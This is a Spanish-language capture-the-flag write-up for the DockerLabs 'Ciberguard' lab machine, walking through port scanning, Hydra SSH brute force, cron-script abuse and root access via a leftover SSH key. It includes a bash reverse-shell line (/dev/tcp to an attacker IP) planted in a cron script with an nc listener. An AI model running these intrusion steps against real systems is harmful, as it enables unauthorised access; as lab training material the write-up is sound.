---
icon: flag
---

# Ciberguard DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip ciberguard.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh ciberguard.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-07 13:25 EDT
Nmap scan report for bicho.dl (172.17.0.2)
Host is up (0.000060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:f6:3a:98:23:dc:8b:00:f0:5c:d5:50:07:f9:ec:e7 (ECDSA)
|_  256 b0:4e:cb:2a:e0:ac:cf:4c:14:7b:23:57:00:6d:12:1d (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: CyberGuard - Seguridad Digital
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.52 seconds
```

Veremos que hay una pagina web alojada en el puerto `80`, si entramos dentro veremos una pagina como de una empresa llamada `ciberguard`, aparentemente no veremos nada interesante, por lo que vamos a realizar un poco de `fuzzing` a ver si encontramos algo mas interesante.

Vemos que hay un panel de `login` en la pagina, por lo que podemos creer que puede haber alguna mala configuracion en algun `script` que maneje la autenticacion.

Si inspeccionamos el codigo y bajamos abajo del todo veremos esto:

```html
<script src="archiv/script.js"></script>
```

Si entramos dentro veremos que esta realizando la validacion de las credenciales para entrar al `panel` de administracion, pero si bajamos abajo del todo, estara la lista de los usuarios validos con sus contraseñas en texto plano:

```js
const usuariosPermitidos = {
    'admin': 'CyberSecure123',
    'cliente': 'Password123',
    'chloe' : 'chloe123'
};
```

Por lo que vamos a probar a `loguearnos` con el usuario `admin`, si lo hacemos veremos que nos carga el `panel` de `administracion` de forma correcta.

<figure><img src="../../.gitbook/assets/image (375).png" alt=""><figcaption></figcaption></figure>

Pero no veremos nada interesante, por lo que vamos a probar a crearnos un diccionario de usuarios y passwords a ver si de las que estan publicas puede haber alguna que sea valida a nivel de sistema.

> users.txt

```
admin
cliente
chloe
```

> pass.txt

```
CyberSecure123
Password123
chloe123
```

## Escalate user chloe

### Hydra

```shell
hydra -L users.txt -P pass.txt ssh://<IP>/ -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-07 13:48:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: chloe   password: chloe123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-07 13:48:13
```

Veremos que hemos encontrado unas credenciales validas, por lo que vamos a conectarnos por `SSH` con dicho usuario.

### SSH

```shell
ssh chloe@<IP>
```

Metemos como contraseña `chloe123` y veremos que estamos dentro.

## Escalate user veronica

Vamos a ver cuantos ususarios encontramos en el sistema:

```shell
cat /etc/passwd | grep "/bin/bash"
```

Info:

```
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
veronica:x:1001:1001:,,,:/home/veronica:/bin/bash
pablo:x:1002:1002:,,,:/home/pablo:/bin/bash
chloe:x:1003:1003:,,,:/home/chloe:/bin/bash
```

Vemos que hay varios usuarios, pero si listamos la `home` entera veremos lo siguiente:

```
total 24
drwxr-xr-x 1 root     root     4096 Apr 16 23:03 .
drwxr-xr-x 1 root     root     4096 May  7 13:24 ..
drwxr-x--- 1 chloe    chloe    4096 Apr 18 22:14 chloe
drwxr-x--- 1 pablo    pablo    4096 May  2 18:11 pablo
drwxr-x--- 2 ubuntu   ubuntu   4096 Jan 26 22:09 ubuntu
drwxr-xrwx 1 veronica veronica 4096 Apr 18 16:35 veronica
```

Vemos que en la carpeta del usuario llamado `veronica` tiene todos los permisos, si entramos dentro veremos varios archivos, si vamos leyendo cada uno de ellos, veremos uno muy interesante en esta parte.

```shell
cat .bash_history
```

Info:

```
dmVyb25pY2ExMjMK
```

Veremos que esta codificado en `Base64`, si lo decodificamos veremos:

```
veronica123
```

Pero no funcionara si lo intentamos, por lo que vamos a intentarlo directamente con el `Base64`.

```shell
su veronica
```

Metemos como contraseña `dmVyb25pY2ExMjMK` y veremos que seremos dicho usuario.

## Escalate user pablo

Vamos a pasarnos el `linpeas.sh` a la maquina victima utilizando desde el `host` la herramienta `scp`.

Primero nos descargamos el `linpeas.sh`:

```shell
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

Ahora ejecutamos lo siguiente para pasarnos el archivo.

```shell
scp linpeas.sh chloe@<IP>:/tmp
```

Metemos como contraseña `chloe123` y veremos que funciono, ahora si vamos a la carpeta `/tmp` de la maquina victima, veremos el binario, lo ejecutaremos de la siguiente forma:

```shell
cd /tmp
chmod +x linpeas.sh
./linpeas.sh
```

De toda la informacion que nos da, vemos una cosa muy interesante, que sera la siguiente:

```
SHELL=/bin/sh

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
* * * * * pedro /home/veronica/.local/script-h.sh > /tmp/hora/hora.log 2>&1
```

Vemos que hay un `crontab` que esta ejecutando el usuario `pablo` un script que esta en la `home` de `veronica`, por lo que vamos a ver si hay alguna vulnerabilidad para ser el usuario `pablo`.

Vamos a ver que procesos estan sucediendo dentro del sistema con un script llamado `pspy64`.

URL = [Download pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64)

Una vez que nos lo hayamos descargado, lo pasamos con la misma herramienta `scp`.

```shell
scp pspy64 chloe@<IP>:/tmp
```

Metemos como contraseña `chloe123` y con esto se habra pasado de forma correcta, ahora en la maquina victima lo ejecutamos de la siguiente forma:

```shell
cd /tmp
./pspy64
```

Info:

```
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/05/07 14:29:39 CMD: UID=1003  PID=9777   | ./pspy64 
2025/05/07 14:29:39 CMD: UID=1003  PID=228    | -bash 
2025/05/07 14:29:39 CMD: UID=1003  PID=227    | sshd: chloe@pts/0 
2025/05/07 14:29:39 CMD: UID=0     PID=216    | sshd: chloe [priv] 
2025/05/07 14:29:39 CMD: UID=0     PID=102    | tail -f /dev/null 
2025/05/07 14:29:39 CMD: UID=0     PID=101    | /usr/sbin/cron -P 
2025/05/07 14:29:39 CMD: UID=0     PID=95     | sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups 
2025/05/07 14:29:39 CMD: UID=33    PID=29     | /usr/sbin/apache2 -k start 
2025/05/07 14:29:39 CMD: UID=33    PID=28     | /usr/sbin/apache2 -k start 
2025/05/07 14:29:39 CMD: UID=0     PID=24     | /usr/sbin/apache2 -k start 
2025/05/07 14:29:39 CMD: UID=0     PID=1      | /bin/sh -c service apache2 start && service ssh start && service cron start && tail -f /dev/null 
2025/05/07 14:30:01 CMD: UID=0     PID=9786   | /usr/sbin/CRON -P 
2025/05/07 14:30:01 CMD: UID=0     PID=9787   | /usr/sbin/CRON -P 
2025/05/07 14:30:01 CMD: UID=1002  PID=9788   | /bin/sh -c /home/veronica/.local/script-h.sh > /tmp/hora/hora.log 2>&1 
2025/05/07 14:30:01 CMD: UID=1002  PID=9789   | 
2025/05/07 14:30:01 CMD: UID=1002  PID=9789   | 
2025/05/07 14:31:01 CMD: UID=0     PID=9791   | /usr/sbin/CRON -P 
2025/05/07 14:31:01 CMD: UID=0     PID=9792   | /usr/sbin/CRON -P 
```

Veremos que efectivamente se esta ejecutando el `crontab` por lo que vamos hacer lo siguiente.

Si listamos la carpeta `.local` veremos lo siguiente:

```
total 16
drwxrwxr-x 3 veronica veronica 4096 Apr 18 11:13 .
drwxr-xrwx 1 veronica veronica 4096 Apr 18 16:35 ..
-rwxrwx--x 1 pablo    taller    121 Apr 17 17:23 script-h.sh
drwx------ 3 veronica veronica 4096 Apr 18 10:47 share
```

Vemos que tanto el usuario `pablo` como el grupo `taller` pueden editar el script, si vemos a que grupos pertenecemos, veremos lo siguiente:

```shell
id
```

Info:

```
uid=1001(veronica) gid=1001(veronica) groups=1001(veronica),100(users),1004(taller)
```

Veremos que somos de dicho `grupo` por lo que podremos editar el `script`, vamos hacer lo siguiente para generar una `reverse shell`.

```shell
cd /home/veronica/.local/
nano script-h.sh

#Dentro del nano
#!/bin/bash

.............................<RESTO DE CODIGO>...................................

sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Lo guardamos y rapidamente nos ponemos a la escucha.

```shell
nc -lvnp <PORT>
```

Ahora solo tendremos que esperar un rato, despues de esperar, si vamos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 40728
bash: cannot set terminal process group (9878): Inappropriate ioctl for device
bash: no job control in this shell
pablo@31379bb8b4c2:~$ whoami
whoami
pablo
```

Veremos que somos el usuario `pablo` por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for pablo on 31379bb8b4c2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User pablo may run the following commands on 31379bb8b4c2:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/nllns/clean_symlink.py *.jpg
```

Vemos que podemos ejecutar el binario `python3` en la ruta absoluta establecida como el usuario `root`.

Si vamos a la carpeta `/tmp` veremos esto de aqui:

```
-rw------- 1 pablo pablo    3381 May  2 16:58 id_rsa
```

Vamos a probar si fuera la clave `PEM` del usuario `root`, por lo que nos la vamos a copiar y pegar en nuestra maquina `host`.

```shell
nano id_rsa

#Dentro del nano

<CLAVE_ID_RSA>
```

Lo guardamos y establecemos los permisos necesarios.

```shell
chmod 600 id_rsa
```

Ahora vamos a probar a meternos como `root` desde `SSH` con la clave `PEM`.

```shell
ssh -i id_rsa root@<IP>
```

Info:

```
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.12.13-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Fri May  2 17:00:02 2025 from ::1
root@31379bb8b4c2:~# whoami
root
```

Con esto veremos que somos `root` por lo que habremos terminado la maquina.
